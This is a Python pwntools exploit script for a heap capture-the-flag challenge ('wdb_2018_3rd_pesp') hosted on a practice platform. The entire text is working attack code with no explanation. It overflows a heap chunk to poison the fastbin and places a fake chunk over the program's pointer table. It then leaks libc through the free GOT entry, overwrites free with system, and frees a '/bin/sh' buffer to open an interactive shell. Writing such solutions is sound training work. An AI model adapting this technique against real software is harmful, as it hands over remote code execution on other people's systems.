import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='wdb_2018_3rd_pesp'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28197)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Please enter the length of servant name:',str(a))
			io.sendafter('Please enter the name of servant:',c)

		def show():
			io.sendlineafter('Your choice:','1')

		def edit(a,b,c):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('Please enter the index of servant:',str(a))
			io.sendlineafter('Please enter the length of servant name:',str(b))
			io.sendafter('Please enter the new name of the servnat:',c)

		def delete(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('Please enter the index of servant:',str(a))
		

		add(0x68,'aaaa')
		add(0x68,'aaaa')
		add(0x68,'/bin/sh\x00')
		add(0x68,'aaaa')
		add(0x68,'aaaa')
		delete(1)
		edit(0,0x98,'a'*0x68+p64(0x71)+p64(0x6020b0-0X3))
		add(0x68,'a')
		add(0x68,'\x00'*3+p64(0x21)+p64(elf.got['free']))
		show()
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()


		edit(0,0x98,p64(system_addr)[:-1])
		delete(2)
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue